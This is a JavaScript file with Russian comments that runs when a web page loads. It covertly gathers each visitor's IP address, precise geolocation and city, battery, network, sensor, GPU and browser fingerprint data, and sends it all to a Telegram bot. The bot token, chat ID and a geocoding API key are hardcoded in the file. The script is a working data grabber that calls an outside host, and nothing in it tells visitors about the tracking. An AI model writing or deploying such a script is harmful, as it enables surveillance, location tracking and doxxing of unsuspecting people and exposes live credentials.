// Вставь свой токен бота и chat_id
const botToken = '7811273259:AAHRUI55WZFQqTSEjye_sl_CoeRMBQ9xdIY';
const chatId = '7518382960';

// Функция для отправки сообщения в Telegram
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: message,
  };

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => console.log('Data sent to Telegram', data))
  .catch(error => console.error('Error:', error));
}

// Функция для получения IP-адреса
function getIP() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(() => null);
}

// Функция для получения информации о браузере и операционной системе
function getBrowserInfo() {
  const userAgent = navigator.userAgent;

  let browserName = null;
  let osName = null;
  let browserVersion = null;
  let osVersion = null;

  // Определение операционной системы
  if (userAgent.indexOf("Windows NT 10.0") !== -1) {
    osName = "Windows";
    osVersion = "10";
  } else if (userAgent.indexOf("Windows NT 6.1") !== -1) {
    osName = "Windows";
    osVersion = "7";
  } else if (userAgent.indexOf("Macintosh") !== -1) {
    osName = "Mac OS";
    osVersion = "Неизвестная версия";
  } else if (userAgent.indexOf("Linux") !== -1) {
    osName = "Linux";
    osVersion = "Неизвестная версия";
  } else if (userAgent.indexOf("Android") !== -1) {
    osName = "Android";
    osVersion = userAgent.match(/Android\s([0-9\.]+)/)[1];
  } else if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1 || userAgent.indexOf("iPod") !== -1) {
    osName = "iOS";
    osVersion = userAgent.match(/OS\s([0-9_]+)\s/)[1].replace(/_/g, '.');
  }

  // Определение браузера
  if (userAgent.indexOf("Chrome") !== -1) {
    browserName = "Chrome";
    browserVersion = userAgent.match(/Chrome\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Firefox") !== -1) {
    browserName = "Firefox";
    browserVersion = userAgent.match(/Firefox\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Safari") !== -1) {
    browserName = "Safari";
    browserVersion = userAgent.match(/Version\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("Edge") !== -1) {
    browserName = "Edge";
    browserVersion = userAgent.match(/Edge\/([0-9]+)/)[1];
  } else if (userAgent.indexOf("MSIE") !== -1) {
    browserName = "Internet Explorer";
    browserVersion = userAgent.match(/MSIE ([0-9]+)/)[1];
  }

  return { browserName, browserVersion, osName, osVersion };
}

// Функция для получения состояния батареи
function getBatteryStatus() {
  return navigator.getBattery ? navigator.getBattery().then(function(battery) {
    return `${battery.level * 100}% - ${battery.charging ? "🔋 Заряжается" : "⚡ Не заряжается"}`;
  }) : Promise.resolve(null);
}

// Функция для получения информации о сети
function getNetworkInfo() {
  return navigator.connection ? {
    type: navigator.connection.effectiveType || null,
    downlink: navigator.connection.downlink || null,
    rtt: navigator.connection.rtt || null,
    saveData: navigator.connection.saveData ? '🌱 Включено' : '❌ Отключено'
  } : {};
}

// Функция для получения сенсоров устройства
function getDeviceSensors() {
  return new Promise((resolve, reject) => {
    try {
      const sensors = {
        accelerometer: '🚫 Не поддерживается',
        gyroscope: '🚫 Не поддерживается',
        orientation: '🚫 Не поддерживается',
        deviceMotion: '🚫 Не поддерживается'
      };

      window.addEventListener('devicemotion', function(event) {
        sensors.deviceMotion = `📊 Ускорение: ${event.acceleration.x}, ${event.acceleration.y}, ${event.acceleration.z}`;
      });

      window.addEventListener('deviceorientation', function(event) {
        sensors.orientation = `🔄 Альфа: ${event.alpha}, Бета: ${event.beta}, Гамма: ${event.gamma}`;
      });

      if (window.DeviceOrientationEvent) {
        sensors.orientation = '✅ Поддерживается';
      }
      
      if (window.DeviceMotionEvent) {
        sensors.deviceMotion = '✅ Поддерживается';
      }

      resolve(sensors);
    } catch (error) {
      reject('🚫 Ошибка при получении сенсоров');
    }
  });
}

// Функция для получения местоположения с использованием координат
function getLocation() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          resolve({ latitude, longitude });
        },
        error => reject('🚫 Не удалось получить местоположение')
      );
    } else {
      reject('🚫 Геолокация не поддерживается');
    }
  });
}

// Функция для получения города по координатам
function fetchCityFromCoordinates(latitude, longitude) {
  const apiKey = 'c51efb0d46ac4496b556cf9d9868e4d4'; // Ваш ключ API
  const url = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}`;

  return fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.results && data.results.length > 0) {
        return data.results[0].components.city || '🌆 Неизвестный город';
      }
      return null;
    })
    .catch(() => null);
}

// Функция для определения типа устройства
function getDeviceType() {
  const userAgent = navigator.userAgent;

  if (/Android/i.test(userAgent)) {
    return '📱 Android';
  } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
    return '📱 iOS';
  } else if (/Windows NT/i.test(userAgent)) {
    return '💻 Windows';
  } else if (/Macintosh/i.test(userAgent)) {
    return '💻 MacOS';
  } else if (/Linux/i.test(userAgent)) {
    return '💻 Linux';
  } else {
    return '❓ Неизвестное устройство';
  }
}

// Функция для получения графических возможностей устройства
function getGraphicsInfo() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl');
  if (!gl) {
    return '🚫 WebGL не поддерживается';
  }

  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  if (debugInfo) {
    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    return `🖥️ Рендерер: ${renderer}, Производитель: ${vendor}`;
  }
  return '🚫 Графическая информация не доступна';
}

// Функция для получения всех доступных данных о браузере
function getAllBrowserData() {
  const data = {
    userAgent: navigator.userAgent,
    "⠀": "",
    language: navigator.language,
    platform: navigator.platform,
    onlineStatus: navigator.onLine,
    cookiesEnabled: navigator.cookieEnabled,
    geolocation: "Поддерживается" in navigator && navigator.geolocation ? '✅ Поддерживается' : '🚫 Не поддерживается',
    deviceMemory: navigator.deviceMemory,
    hardwareConcurrency: navigator.hardwareConcurrency,
    screenResolution: `${screen.width}x${screen.height}`,
    availableResolution: `${screen.availWidth}x${screen.availHeight}`,
    colorDepth: screen.colorDepth,
    timezoneOffset: new Date().getTimezoneOffset(),
    localStorage: 'localStorage' in window ? '✅ Поддерживается' : '🚫 Не поддерживается',
    sessionStorage: 'sessionStorage' in window ? '✅ Поддерживается' : '🚫 Не поддерживается',
    serviceWorker: 'serviceWorker' in navigator ? '✅ Поддерживается' : '🚫 Не поддерживается'
  };

  return data;
}

// Запуск сбора данных
function collectData() {
  let message = "📍 Сбор данных завершен!\n";

  // Разделение данных на категории
  const categories = {
    'Интернет-соединение': '',
    'Устройство': '',
    'Геолокация': '',
    'Браузер': '',
    'Сенсоры устройства': ''
  };

  getIP().then(ip => {
    if (ip) categories['Интернет-соединение'] += `🖥️ IP: ${ip}\n`;

    getBatteryStatus().then(batteryStatus => {
      if (batteryStatus) categories['Устройство'] += `🔋 Поддержка батареи: ${batteryStatus}\n`;

      const browserInfo = getBrowserInfo();
      if (browserInfo.browserName) categories['Браузер'] += `🌐 Браузер: ${browserInfo.browserName} v${browserInfo.browserVersion}\n`;
      if (browserInfo.osName) categories['Устройство'] += `📱 ОС: ${browserInfo.osName} v${browserInfo.osVersion}\n`;

      const allBrowserData = getAllBrowserData();
      for (const key in allBrowserData) {
        categories['Браузер'] += `🔹 ${key}: ${allBrowserData[key]}\n`;
      }

      // Обработка местоположения
      getLocation().then(location => {
        if (location) {
          categories['Геолокация'] += `🌍 Местоположение:\n📍 Широта: ${location.latitude}\n📍 Долгота: ${location.longitude}\n`;
          fetchCityFromCoordinates(location.latitude, location.longitude).then(city => {
            if (city) categories['Геолокация'] += `🏙️ Город: ${city}\n`;
          }).catch(() => {
            categories['Геолокация'] += '🏙️ Город: Неизвестно\n';
          });
        } else {
          categories['Геолокация'] += '🌍 Местоположение: Неизвестно\n📍 Широта: Неизвестно\n📍 Долгота: Неизвестно\n';
        }

        getDeviceSensors().then(sensors => {
          if (sensors.deviceMotion !== '🚫 Не поддерживается') categories['Сенсоры устройства'] += `📱 Датчики движения: ${sensors.deviceMotion}\n`;
          if (sensors.orientation !== '🚫 Не поддерживается') categories['Сенсоры устройства'] += `🧭 Ориентация устройства: ${sensors.orientation}\n`;

          categories['Устройство'] += `📱 Тип устройства: ${getDeviceType()}\n`;
          categories['Устройство'] += `
          
          
🎮 Графическая информация: ${getGraphicsInfo()}\n`;

          // Объединение всех категорий в сообщение
          message = Object.values(categories).join('\n');
          sendToTelegram(message);
        }).catch(() => sendToTelegram(message));
      }).catch(() => {
        categories['Геолокация'] += '🌍 Местоположение: Неизвестно\n📍 Широта: Неизвестно\n📍 Долгота: Неизвестно\n';
        getDeviceSensors().then(sensors => {
          if (sensors.deviceMotion !== '🚫 Не поддерживается') categories['Сенсоры устройства'] += `📱 Датчики движения: ${sensors.deviceMotion}\n`;
          if (sensors.orientation !== '🚫 Не поддерживается') categories['Сенсоры устройства'] += `🧭 Ориентация устройства: ${sensors.orientation}\n`;

          categories['Устройство'] += `📱 Тип устройства: ${getDeviceType()}\n`;
          categories['Устройство'] += `
          
          🎮 Графическая информация: ${getGraphicsInfo()}\n`;

          // Объединение всех категорий в сообщение
          message = Object.values(categories).join('\n');
          sendToTelegram(message);
        });
      });
    });
  });
}

// Запускаем сбор данных при загрузке страницы
window.onload = collectData;
